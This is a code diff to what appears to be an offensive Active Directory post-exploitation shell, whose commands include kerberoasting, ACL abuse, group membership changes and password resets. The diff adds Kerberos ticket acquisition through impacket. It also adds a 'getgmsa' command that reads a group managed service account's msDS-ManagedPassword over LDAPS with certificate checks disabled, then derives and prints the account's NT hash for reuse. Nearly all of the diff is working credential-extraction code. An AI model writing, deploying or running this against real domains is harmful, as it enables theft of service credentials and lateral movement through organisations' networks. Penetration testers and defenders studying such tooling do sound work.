@@ -20,7 +20,7 @@ COMMANDS = [
     "sessions", "status", "query", "history", "batch_lookup",
     "categories", "groups", "users", "computers", "kerberoasting", "checkacl", "addmember",
     "setpass", "help", "exit", "savepassword", "show_all_history", "offline_search", "shares",
-    "get_sid"
+    "get_sid", "getgmsa"
 ]
 
 def shell_completer(text, state):
@@ -672,10 +672,40 @@ def connect(connection):
             base_dn = domain_to_dn(domain)
 
             try:
-                print(f"[*] Attempting to fetch Kerberos ticket for {username}@{domain}...")
-                os.system(f"echo '{password}' | kinit {username}@{domain}")
-                server = Server(dc_ip, get_info=ALL)
-                conn = Connection(server, user=f"{netbios}\\{username}", password=password, authentication=SASL, sasl_mechanism=KERBEROS, auto_bind=True)
+                from impacket.krb5.kerberosv5 import getKerberosTGT
+                from impacket.krb5.types import Principal
+                from impacket.krb5 import constants
+                from impacket.krb5.ccache import CCache
+
+                realm = domain.upper()
+                print(f"[*] Getting TGT for {username}@{realm} via impacket...")
+
+                # Build principal (works with machine accounts like MS01$)
+                user_principal = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+                tgt, cipher, old_session_key, session_key = getKerberosTGT(user_principal, password, realm, None, None, None, dc_ip)
+
+                # Save to ccache file (same as getTGT.py)
+                ccache = CCache()
+                ccache.fromTGT(tgt, old_session_key, session_key)
+                ccache_file = f"{username}.ccache"
+                ccache.saveFile(ccache_file)
+                os.environ["KRB5CCNAME"] = ccache_file
+                print(f"[+] TGT saved to {ccache_file}")
+
+                # Kerberos needs DC hostname, not IP (for SPN matching)
+                # First get the DC hostname
+                tmp_server = Server(dc_ip, get_info=ALL)
+                tmp_conn = Connection(tmp_server, auto_bind=True)
+                dc_hostname = tmp_server.info.other.get('dnsHostName', [None])[0]
+                tmp_conn.unbind()
+
+                if not dc_hostname:
+                    dc_hostname = dc_ip
+                    print(f"[!] Could not resolve DC hostname, using IP (may fail)")
+
+                print(f"[*] Connecting to {dc_hostname} via Kerberos...")
+                server = Server(dc_hostname, get_info=ALL)
+                conn = Connection(server, authentication=SASL, sasl_mechanism=KERBEROS, auto_bind=True)
                 profile = {"ip": dc_ip, "username": username, "password": password, "conn":conn, "base_dn":base_dn, "connected_at": time.time(), "domain": domain, "ldaps":False}
                 if sessions.size() >= MAX_SESSIONS:
                     removed = sessions.items.pop(0)
@@ -685,7 +715,7 @@ def connect(connection):
                 sessions.push(profile)
                 if not current_session:
                     current_session = profile
-                print(f"[bold green][!] Connected to {domain}. Session ID: {sessions.size()-1}[/bold green]")
+                print(f"[bold green][+] Connected to {domain} via Kerberos. Session ID: {sessions.size()-1}[/bold green]")
                 save_password(password)
             except Exception as e:
                 print(f"[-] Connection Failed: {e}")
@@ -871,6 +901,7 @@ def connect(connection):
             args.dc_fqdn = None
             args.hash = current_session.get("nthash")
             args.ldaps = current_session.get("ldaps", False)
+            args.kerberos = bool(os.environ.get("KRB5CCNAME"))
 
             try:
                 from aclftw import aclftw
@@ -1066,6 +1097,85 @@ def connect(connection):
                 add_member(current_session["conn"], current_session["base_dn"], command[1], command[2])
             except Exception as e:
                 print(f"[-] Error while add users: {e}")
+        elif command[0] == "getgmsa":
+            if not current_session:
+                print("No active session! Please 'use' a session or 'connect' first.")
+                continue
+            if len(command) < 2:
+                print("getgmsa <gmsa_account$>")
+                continue
+            target_gmsa = command[1]
+            if not target_gmsa.endswith('$'):
+                target_gmsa += '$'
+
+            try:
+                conn = current_session["conn"]
+                base_dn = current_session["base_dn"]
+                tmp_conn = None
+
+                # If not LDAPS, we need an LDAPS connection to read the msDS-ManagedPassword
+                if not current_session.get("ldaps", False):
+                    tls = Tls(validate=ssl.CERT_NONE)
+                    # use the same host used in the current connection (hostname or IP)
+                    target_host = current_session["conn"].server.host
+                    server = Server(target_host, port=636, use_ssl=True, get_info=ALL, tls=tls)
+                    
+                    if current_session.get("conn").sasl_mechanism == KERBEROS or "KRB5CCNAME" in os.environ:
+                        tmp_conn = Connection(server, authentication=SASL, sasl_mechanism=KERBEROS, auto_bind=True)
+                    elif current_session.get("nthash"):
+                        password = f"aad3b435b51404eeaad3b435b51404ee:{current_session['nthash']}"
+                        tmp_conn = Connection(server, user=current_session["conn"].user, password=password, authentication=NTLM, auto_bind=True)
+                    else:
+                        tmp_conn = Connection(server, user=current_session["conn"].user, password=current_session["password"], authentication=NTLM, auto_bind=True)
+                    
+                    search_conn = tmp_conn
+                else:
+                    search_conn = conn
+
+                search_conn.search(base_dn, f"(sAMAccountName={target_gmsa})", attributes=['msDS-ManagedPassword'])
+
+                if not search_conn.entries:
+                    print(f"[-] Could not find account: {target_gmsa}")
+                    if tmp_conn: tmp_conn.unbind()
+                    continue
+                entry = search_conn.entries[0]
+
+                if "msDS-ManagedPassword" not in entry or not entry["msDS-ManagedPassword"].raw_values:
+                    print(f"[bold red][-] Failed! The attribute is empty or you lack 'ReadGmsaPassword' permissions.[/bold red]")
+                    if tmp_conn: tmp_conn.unbind()
+                    continue
+
+                password_blob = entry["msDS-ManagedPassword"].raw_values[0]
+
+                import struct
+                import hashlib
+
+                version, reserved, length, cur_off, prev_off, query_off, unch_off = struct.unpack('<HHLHHHH', password_blob[:16])
+
+                # The current password ends where the next non-zero offset begins
+                offsets = [o for o in [prev_off, query_off, unch_off] if o > cur_off]
+                end_off = min(offsets) if offsets else len(password_blob)
+                
+                pwd_bytes = password_blob[cur_off:end_off]
+                
+                # Remove the trailing 2-byte null terminator for NT hash
+                if len(pwd_bytes) >= 2:
+                    pwd_bytes = pwd_bytes[:-2]
+
+                nt_hash = hashlib.new('md4', pwd_bytes).hexdigest()
+
+                print(f"\n[bold green][+] Successfully extracted GMSA password for {target_gmsa}[/bold green]")
+                print(f"[bold cyan]NT Hash: {nt_hash}[/bold cyan]")
+                
+                if tmp_conn:
+                    tmp_conn.unbind()
+
+            except Exception as e:
+                print(f"[-] Error retrieving GMSA Password: {e}")
+
+
+
+
         elif command[0] == "exit":
             break
         else:
